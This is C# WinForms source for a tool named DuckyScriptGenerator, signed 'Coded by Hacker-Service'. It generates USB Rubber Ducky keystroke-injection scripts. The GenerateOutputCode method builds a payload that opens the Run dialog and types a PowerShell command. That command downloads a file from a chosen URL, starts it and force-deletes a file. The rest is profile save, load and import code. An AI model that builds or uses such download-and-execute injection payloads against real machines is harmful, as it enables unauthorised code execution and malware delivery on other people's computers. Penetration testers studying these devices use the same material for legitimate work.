using System.Diagnostics;
using System.Text.Json;
using System.Windows.Forms;

namespace DuckyScriptGenerator
{
    public partial class Form1 : Form
    {
        private SaveFileDialog saveFileDialog;
        private OpenFileDialog openFileDialog;

        public Form1()
        {
            InitializeComponent();
            InitializeFileDialogs();
            LoadProfiles();
        }

        // Making the FileDialogs ready for action
        private void InitializeFileDialogs()
        {
            saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";

            openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Profile files (*.json)|*.json|All files (*.*)|*.*";
        }


        // Gets profile configurations from the "\Profiles" and adds them to the combobox (cbProfiles)
        private void LoadProfiles()
        {
            cbProfiles.Items.Clear(); // Clear the existing items

            if (Directory.Exists("Profiles"))
            {
                string[] profileFiles = Directory.GetFiles("Profiles", "*.json");
                foreach (string profileFile in profileFiles)
                {
                    string profileName = Path.GetFileNameWithoutExtension(profileFile);
                    cbProfiles.Items.Add(profileName);
                }
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            // Initialize the SaveFileDialog
            saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
        }


        // ----------------------------------------------------------------------------------------------------- //
        // 
        //                                          FILE STUFF
        //
        // ----------------------------------------------------------------------------------------------------- //
        private void cbDownloadFile_CheckedChanged(object sender, EventArgs e)
        {
            // Disables or Enables the text fields
            if (cbDownloadFile.Checked)
            {
                txtDownloadFileURL.Enabled = true;
                txtDownloadFilePath.Enabled = true;
            }
            else
            {
                txtDownloadFileURL.Enabled = false;
                txtDownloadFilePath.Enabled = false;
            }
        }

        private void cbExecuteFile_CheckedChanged(object sender, EventArgs e)
        {
            // Disables or Enables the text fields
            if (cbExecuteFile.Checked)
            {
                txtExecuteFile.Enabled = true;
            }
            else
            {
                txtExecuteFile.Enabled = false;
            }
        }

        private void cbDeleteFile_CheckedChanged(object sender, EventArgs e)
        {
            // Disables or Enables the text fields
            if (cbDeleteFile.Checked)
            {
                txtDeleteFile.Enabled = true;
            }
            else
            {
                txtDeleteFile.Enabled = false;
            }
        }

        // ----------------------------------------------------------------------------------------------------- //
        // 
        //                                          OUTPUT BUTTONS
        //
        // ----------------------------------------------------------------------------------------------------- //

        // Event handler for the Save button
        private void btnSaveDC_Click(object sender, EventArgs e)
        {
            // Show the SaveFileDialog to get the user's chosen file path
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                // Get the selected file path from the SaveFileDialog
                string filePath = saveFileDialog.FileName;

                try
                {
                    // Write the contents of txtOutput.Text to the selected file
                    System.IO.File.WriteAllText(filePath, txtOutput.Text);

                    // Get the directory path from the selected file path
                    string directoryPath = Path.GetDirectoryName(filePath);

                    // Open the directory in File Explorer
                    Process.Start("explorer.exe", directoryPath);

                    MessageBox.Show("File saved successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error saving file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        // Just calls "GenerateOutputCode", may do more in future...
        private void btnGenerateDS_Click(object sender, EventArgs e)
        {
            GenerateOutputCode();
        }

        // The Generation of the duckycode.
        private void GenerateOutputCode()
        {
            // Stage 1 and 2 payloads. Just regular Win + R payload. It executes "customContent" with powershell.
            string duckyCodeStage1 = $"REM Coded by Hacker-Service\r\n" + $"DELAY 500\r\n" + $"GUI r\r\n" + $"DELAY 1500\r\n" + $"STRING ";
            string duckyCodeStage2 = $"\r\nDELAY 500\r\n" + $"ENTER\r\n";


            // Bool value to check if User wants to use a stage 3 payload.
            bool hasStage3 = false;

            // Bool value to check if User wants to use a stage 4 payload.
            bool hasStage4 = false;


            // Have not implemented this yet (Stage 3)
            string duckyCodeStage3 = $"DELAY 500\r\n" + $"ENTER\r\n";

            // Have not implemented this yet (Stage 4)
            string duckyCodeStage4 = $"DELAY 500\r\n" + $"ENTER\r\n";


            // The payload on stage 1/2.
            string customContent = "";

            // Check if Download File option is selected and retrieve the file name and path
            if (cbDownloadFile.Checked)
            {
                string downloadFileName = txtDownloadFileURL.Text;
                string downloadFilePath = txtDownloadFilePath.Text;
                // Construct the Duckyscript command for downloading the file
                customContent += $"(New-Object Net.WebClient).DownloadFile(\"{downloadFileName}\", \"{downloadFilePath}\"); ";
            }

            // Check if Execute File option is selected and retrieve the file name
            if (cbExecuteFile.Checked)
            {
                string executeFileName = txtExecuteFile.Text;
                // Construct the Duckyscript command for executing the file
                customContent += $"Start-Process \"{executeFileName}\"; ";
            }

            // Check if Delete File option is selected and retrieve the file path to delete
            if (cbDeleteFile.Checked)
            {
                string DeleteFilePathName = txtDeleteFile.Text;
                // Construct the Duckyscript command for executing the file
                customContent += $"Remove-Item \"{DeleteFilePathName}\" -Force; ";
            }

            customContent += "exit";

            // Construct the PowerShell command to execute the Duckyscript payload
            string powershellCommand = $"powershell -c \"{customContent.Replace("\"", "\\\"")}\"";

            // Update the txtOutput textbox with the PowerShell command
            if (hasStage4)
            {
                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3 + duckyCodeStage4;
            }
            else if (hasStage3)
            {
                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2 + duckyCodeStage3;
            }
            else
            {
                // Uses only stage 1 and 2
                txtOutput.Text = duckyCodeStage1 + powershellCommand + duckyCodeStage2;
            }

        }


        // ----------------------------------------------------------------------------------------------------- //
        // 
        //                                          PROFILE STUFF
        //
        // ----------------------------------------------------------------------------------------------------- //

        // Creates/Saves a profile 
        private void SaveProfile(string profileName, Profile profile)
        {
            string profilePath = Path.Combine("Profiles", $"{profileName}.json");
            string profileJson = JsonSerializer.Serialize(profile);

            // Create the Profiles directory if it doesn't exist
            Directory.CreateDirectory("Profiles");

            File.WriteAllText(profilePath, profileJson);
        }

        // Loads a profile
        private Profile LoadProfile(string profileName)
        {
            string profilePath = Path.Combine("Profiles", $"{profileName}.json");

            if (File.Exists(profilePath))
            {
                string profileJson = File.ReadAllText(profilePath);
                return JsonSerializer.Deserialize<Profile>(profileJson);
            }

            return null;
        }

        // Event handler for saving a profile or creating one (If current profile in "cbProfiles" is empty it will create).
        private void btnSaveProfile_Click(object sender, EventArgs e)
        {
            string selectedProfileName = cbProfiles.SelectedItem?.ToString();

            if (string.IsNullOrWhiteSpace(selectedProfileName))
            {
                selectedProfileName = "NewProfile"; // Set a default name for new profiles

                // Ensure the profile name is unique
                int counter = 1;
                while (cbProfiles.Items.Contains(selectedProfileName))
                {
                    selectedProfileName = $"NewProfile{counter}";
                    counter++;
                }

                // Add the new profile name to the ComboBox
                cbProfiles.Items.Add(selectedProfileName);
            }

            // Select the newly created or selected profile
            cbProfiles.SelectedItem = selectedProfileName;

            Profile profile = CreateProfileFromUI();
            SaveProfile(selectedProfileName, profile);

            MessageBox.Show("Profile saved successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        // Event handler for loading a profile
        private void btnLoadProfile_Click(object sender, EventArgs e)
        {
            if (cbProfiles.SelectedIndex == -1)
            {
                MessageBox.Show("Please select a profile.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string selectedProfileName = cbProfiles.SelectedItem.ToString();
            Profile loadedProfile = LoadProfile(selectedProfileName);

            if (loadedProfile != null)
            {
                ApplyProfileToUI(loadedProfile);
                MessageBox.Show("Profile loaded successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Selected profile not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Event handler for renaming a profile. It also updates the "cbProfiles" by calling "LoadProfiles"
        private void btnRenameProfile_Click(object sender, EventArgs e)
        {
            if (cbProfiles.SelectedIndex != -1)
            {
                string selectedProfileName = cbProfiles.SelectedItem.ToString();
                string newProfileName = PromptForProfileName(selectedProfileName);

                if (!string.IsNullOrWhiteSpace(newProfileName))
                {
                    RenameProfile(selectedProfileName, newProfileName);
                    LoadProfiles();
                }
            }
            else
            {
                MessageBox.Show("Please select a profile to rename.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Event handler for deleting a profile
        private void btnDeleteProfile_Click(object sender, EventArgs e)
        {
            if (cbProfiles.SelectedIndex == -1)
            {
                MessageBox.Show("Please select a profile to delete.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string selectedProfileName = cbProfiles.SelectedItem.ToString();

            DialogResult confirmResult = MessageBox.Show($"Are you sure you want to delete the profile '{selectedProfileName}'?",
                                                        "Confirm Deletion", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            if (confirmResult == DialogResult.Yes)
            {
                string profileFilePath = Path.Combine("Profiles", $"{selectedProfileName}.json");
                File.Delete(profileFilePath);

                LoadProfiles(); // Refresh the ComboBox

                MessageBox.Show("Profile deleted successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        // Event handler for exporting a profile
        private void btnExportProfile_Click(object sender, EventArgs e)
        {
            if (cbProfiles.SelectedIndex == -1)
            {
                MessageBox.Show("Please select a profile to export.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string selectedProfileName = cbProfiles.SelectedItem.ToString();
            string profileFilePath = Path.Combine("Profiles", $"{selectedProfileName}.json");

            saveFileDialog.FileName = selectedProfileName + ".json";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.Copy(profileFilePath, saveFileDialog.FileName, true);
                    MessageBox.Show("Profile exported successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error exporting profile: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        // Event handler for importing profiles or a profile.
        private void btnImportProfile_Click(object sender, EventArgs e)
        {
            openFileDialog.Filter = "Profile files (*.json)|*.json|All files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string selectedFilePath = openFileDialog.FileName;

                try
                {
                    // Deserialize the JSON content into a Profile object
                    string jsonContent = File.ReadAllText(selectedFilePath);
                    Profile importedProfile = JsonSerializer.Deserialize<Profile>(jsonContent);

                    // Save the imported profile to the "Profiles" directory
                    string importedProfileName = Path.GetFileNameWithoutExtension(selectedFilePath);
                    string importedProfileFilePath = Path.Combine("Profiles", $"{importedProfileName}.json");
                    string uniqueImportedProfileName = GenerateUniqueProfileName(importedProfileName);
                    importedProfileFilePath = Path.Combine("Profiles", $"{uniqueImportedProfileName}.json");

                    string serializedProfile = JsonSerializer.Serialize(importedProfile);
                    File.WriteAllText(importedProfileFilePath, serializedProfile);

                    // Refresh the ComboBox
                    LoadProfiles();

                    MessageBox.Show("Profile imported successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error importing profile: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        // Creates variables for a profile config file 
        private Profile CreateProfileFromUI()
        {
            return new Profile
            {
                DownloadFileEnabled = cbDownloadFile.Checked,
                DownloadFileURL = txtDownloadFileURL.Text,
                DownloadFilePath = txtDownloadFilePath.Text,
                ExecuteFileEnabled = cbExecuteFile.Checked,
                ExecuteFileName = txtExecuteFile.Text,
                DeleteFileEnabled = cbDeleteFile.Checked,
                DeleteFilePath = txtDeleteFile.Text
            };
        }

        // Reads and applyies variables from a profile config file
        private void ApplyProfileToUI(Profile profile)
        {
            cbDownloadFile.Checked = profile.DownloadFileEnabled;
            txtDownloadFileURL.Text = profile.DownloadFileURL;
            txtDownloadFilePath.Text = profile.DownloadFilePath;
            cbExecuteFile.Checked = profile.ExecuteFileEnabled;
            txtExecuteFile.Text = profile.ExecuteFileName;
            cbDeleteFile.Checked = profile.DeleteFileEnabled;
            txtDeleteFile.Text = profile.DeleteFilePath;
        }

        // The prompt for renaming a profile (Just a prompt for the user)
        private string PromptForProfileName(string currentName)
        {
            using (Form prompt = new Form())
            {
                prompt.Width = 400;
                prompt.Height = 150;
                prompt.Text = "Rename Profile";
                Label textLabel = new Label() { Left = 50, Top = 20, Text = $"Enter a new name for '{currentName}':" };
                TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 300 };
                Button confirmation = new Button() { Text = "Rename", Left = 250, Width = 100, Top = 80, DialogResult = DialogResult.OK };
                prompt.Controls.Add(textBox);
                prompt.Controls.Add(confirmation);
                prompt.Controls.Add(textLabel);
                prompt.AcceptButton = confirmation;

                if (prompt.ShowDialog() == DialogResult.OK)
                {
                    return textBox.Text;
                }
            }
            return null;
        }

        // Mechanics behind renaming a file.
        private void RenameProfile(string currentName, string newName)
        {
            string oldFilePath = Path.Combine("Profiles", $"{currentName}.json");
            string newFilePath = Path.Combine("Profiles", $"{newName}.json");

            if (File.Exists(oldFilePath))
            {
                File.Move(oldFilePath, newFilePath);
            }
        }

        // Generates a Uniqe filename for imported profiles.
        private string GenerateUniqueProfileName(string baseName)
        {
            string uniqueName = baseName;
            int counter = 1;
            while (File.Exists(Path.Combine("Profiles", $"{uniqueName}.json")))
            {
                uniqueName = $"{baseName}_{counter}";
                counter++;
            }
            return uniqueName;
        }

    }

    // All options that can be set and used.
    public class Profile
    {
        public bool DownloadFileEnabled { get; set; }
        public string DownloadFileURL { get; set; }
        public string DownloadFilePath { get; set; }
        public bool ExecuteFileEnabled { get; set; }
        public string ExecuteFileName { get; set; }
        public bool DeleteFileEnabled { get; set; }
        public string DeleteFilePath { get; set; }
    }

}